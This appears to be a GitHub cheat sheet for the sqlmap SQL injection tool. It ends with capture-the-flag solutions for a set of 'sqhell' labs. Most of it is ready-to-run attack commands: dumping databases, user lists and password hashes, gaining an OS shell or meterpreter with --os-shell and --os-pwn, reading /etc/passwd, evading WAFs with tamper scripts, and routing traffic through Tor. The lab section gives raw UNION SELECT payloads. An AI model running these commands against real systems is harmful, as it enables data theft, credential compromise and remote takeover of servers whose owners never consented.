# SQLmapCheatSheet
# Attack Example:
    $ sqlmap -u www.site.com/index.php?id=1 -- batch --dbs
    $ sqlmap -u www.site.com/index.php?id=1 -- batch -D database_name --tables
    $ sqlmap -u www.site.com/index.php?id=1 -- batch -D database_name -T table_name --columns
    $ sqlmap -u www.site.com/index.php?id=1 -- batch -D database_name -T table_name -C columns_name1,columns_name2,columns_name3 --dump
    $ sqlmap -r burpsuite_copy_to_file.txt -p username --batch --dump
    
    $ sqlmap -u www.site.com/ --crawl 2 --batch
    $ sqlmap -u www.site.com/ --crawl 2 --batch --technique="U"
    $ sqlmap -u www.site.com/ --crawl 2 --batch risk 3
    $ sqlmap -u www.site.com/ --crawl 2 --batch risk 3 --level 5
    $ sqlmap -u www.site.com/ --crawl 2 --batch -v 4
    $ sqlmap -u www.site.com/index.php?id=1 -- batch --dbs --current-user --hostname --current-db
    
    $ sqlmap -u www.site.com/ --crawl 2 --batch --output-dir="/home/nazmul/Desktop"
    $ sqlmap -u www.site.com/ --crawl 2 --batch --header="Referer:www.abc.com" -v 4
    
    ![image](https://user-images.githubusercontent.com/130249045/233613025-ddc044a8-a101-487c-9c92-63cbdb9b3a9f.png)

    



## Basic arguments for SQLmap
Generic 
-   -u " < URL > " 
-   -p "<PARAM TO TEST>" 
-   --user-agent=SQLMAP 
-   --random-agent 
-   --threads=10 
-   --risk=3 #MAX
-   --level=5 #MAX
-   --dbms="<KNOWN DB TECH>" 
-   --os="<OS>"
-   --technique="UB" #Use only techniques UNION and BLIND in that order (default "BEUSTQ")
-   --batch #Non interactive mode, usually Sqlmap will ask you questions, this accepts the default answers
-   --auth-type="<AUTH>" #HTTP authentication type (Basic, Digest, NTLM or PKI)
-   --auth-cred="<AUTH>" #HTTP authentication credentials (name:password)
-   --proxy=http://127.0.0.1:8080
-   --union-char "GsFRts2" #Help sqlmap identify union SQLi techniques with a weird union char

## Retrieve Information
Internal
-   --current-user #Get current user
-   --is-dba #Check if current user is Admin
-   --hostname #Get hostname
-   --users #Get usernames od DB
-   --passwords #Get passwords of users in DB
-   --privileges #Get privileges


## DB data
-   --all #Retrieve everything
-   --dump #Dump DBMS database table entries
-   --dbs #Names of the available databases
-   --tables #Tables of a database ( -D <DB NAME> )
-   --columns #Columns of a table  ( -D <DB NAME> -T <TABLE NAME> )
-   -D <DB NAME> -T <TABLE NAME> -C <COLUMN NAME> #Dump column


## Injection place
    -   From BurpSuite/ZAP capture
    -   Capture the request and create a req.txt file!
```[sqlmap -r req.txt --current-user]```

## GET Request Injection
```powershell
sqlmap -u "http://example.com/?id=1" -p id
```
```powershell
sqlmap -u "http://example.com/?id=*" -p id
```
## POST Request Injection 
```powershell
sqlmap -u "http://example.com" --data "username=*&password=*"
```
## Injections in Headers and other HTTP Methods
# Inside cookie
```powershell
sqlmap  -u "http://example.com" --cookie "mycookies=*"
```
## Inside some header
-  sqlmap -u "http://example.com" --headers="x-forwarded-for:127.0.0.1*"
-  sqlmap -u "http://example.com" --headers="referer:*"

## PUT Method
-  sqlmap --method=PUT -u "http://example.com" --headers="referer:*"
-  <!--The injection is located at the '*'-->



## Indicate string when injection is successful
-  --string="string_showed_when_TRUE" 


## Eval
Sqlmap allows the use of -e or --eval to process each payload before sending it with some python oneliner. This makes very easy and fast to process in custom ways the payload before sending it. In the following example the flask cookie session is signed by flask with the known secret before sending it:
-  sqlmap http://1.1.1.1/sqli --eval "from flask_unsign import session as s; session = s.sign({'uid': session}, secret='SecretExfilratedFromTheMachine')" --cookie="session=*" --dump



## Shell
# Exec command
-  python sqlmap.py -u "http://example.com/?id=1" -p id --os-cmd whoami

# Simple Shell
-  python sqlmap.py -u "http://example.com/?id=1" -p id --os-shell

# Dropping a reverse-shell / meterpreter
-  python sqlmap.py -u "http://example.com/?id=1" -p id --os-pwn



# Read File
-  --file-read=/etc/passwd


## Crawl a website with SQLmap and auto-exploit ->
-  sqlmap -u "http://example.com/" --crawl=1 --random-agent --batch --forms --threads=5 --level=5 --risk=3

-  --batch = non interactive mode, usually Sqlmap will ask you questions, this accepts the default answers
-  --crawl = how deep you want to crawl a site
-  --forms = Parse and test forms


## Second Order Injection
-  python sqlmap.py -r /tmp/r.txt --dbms MySQL --second-order "http://targetapp/wishlist" -v 3
-  sqlmap -r 1.txt -dbms MySQL -second-order "http://<IP/domain>/joomla/administrator/index.php" -D "joomla" -dbs



## Set a suffix
-  python sqlmap.py -u "http://example.com/?id=1"  -p id --suffix="-- "


## Prefix
-  python sqlmap.py -u "http://example.com/?id=1"  -p id --prefix="') "


## Help finding boolean injection
# The --not-string "string" will help finding a string that does not appear in True responses (for finding boolean blind injection)
-  sqlmap -r r.txt -p id --not-string ridiculous --batch


# Output verbosity
This option can be used to set the verbosity level of output messages. There exist seven levels of verbosity. The default level is 1 in which information, warning, error, critical messages and Python tracebacks (if any occur) are displayed.

        0: Show only Python tracebacks,         error and critical messages.
        1: Show also information and warning messages.
        2: Show also debug messages.
        3: Show also payloads injected.
        4: Show also HTTP requests. -payload
        5: Show also HTTP responses' headers.
        6: Show also HTTP responses' page content.



# WAF

        sqlmap --list -tempers
        sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 --level 2 --risk 2 --tamper='uppercase.py' -v 4
    # TOR
        sudo apt update
        sudo apt install tor
        sudo service tor start
        netstat -antp | grep 9050
        sqlmap -u <target_url> --tor --tor-type=SOCKS5 --tor-port=9050 --random-agent --tamper=space2comment









# hqhell - >
        Lab number 1
        admin OR 1=1--

        Lab number 5
        http://10.10.165.23/post?id=2 AND 1=2 UNION SELECT 1, COLUMN_NAME, 3, 4 FROM information_schema.columns WHERE table_name = 'flag' limit 2, 1--

        http://10.10.165.23/post?id=2 AND 1=2 UNION%20 SELECT 1, TABLE_NAME, 3, 4 FROM information_schema.tables WHERE table_schema ='sqhell_5'--

        AND 1=2 UNION SELECT 1,2, flag, 4 FROM flag--

        Lab number 3
        http://10.10.7.103/register/user-check?username=admin' UNION SELECT 1, 2, 3 FROM flag WHERE flag LIKE T%25

        sqlmap -u http://10.10.7.103/register/user-check?username=admin --dump

        Lab number 2
        sqlmap -u url --headers="X-Forwarded-For:1*" --dump --batch

        lAB NUMBER 4
        AND 1=2 union all select '1 UNION SELECT 1,flag,3,4 from flag-- -',2,3 from sqhell_4.users LIMIT 0,1--
